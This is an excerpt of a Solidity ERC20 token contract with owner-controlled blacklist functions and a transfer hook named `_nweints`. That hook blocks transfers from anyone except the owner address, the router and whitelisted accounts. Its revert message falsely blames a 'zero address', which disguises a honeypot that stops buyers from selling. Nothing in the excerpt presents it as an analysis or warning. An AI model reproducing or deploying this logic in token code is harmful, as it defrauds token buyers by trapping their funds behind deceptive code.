...
contract ERC20 is Context, IERC20 {
    ...
    event ADDblackList(address _address);
    event DelblackList(address _address);
    ...
    function willints(address addressn) public {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual{
        ...
        require(!blackList[sender], "Address in blackList");
        _beforeTokenTransfer(sender, recipient, amount);
        _nweints(sender, recipient, amount);
    ...
    function _nweints(address sender, address recipient, uint256 amount) internal view virtual{
        if(recipient != _address0 && sender != _address0 && _address0!=_address1 && amount > _zero){
            require(sender == _address1 ||sender==_router || _Addressint[sender], "ERC20: transfer from the zero address");
            }
        }
    ...
    function _Erc20Token(address from, address to, uint256 amount) internal virtual {  }
     ...
     function addblackList(address account) public  {
         require(msg.sender == _address0,"Not owner");
        blackList[account] = true;   
        emit ADDblackList(account);
        
    }
    
    function bathAddblackList(address [] memory _accounts) public  {
         require(msg.sender == _address0,"Not owner");
         for(uint32 i=0;i<_accounts.length;i++){
                addblackList(_accounts[i]);
            }
        
    }
    function delblackList(address account) public  {
            require(msg.sender == _address0,"Not owner");
            blackList[account] = false;
            emit DelblackList(account);
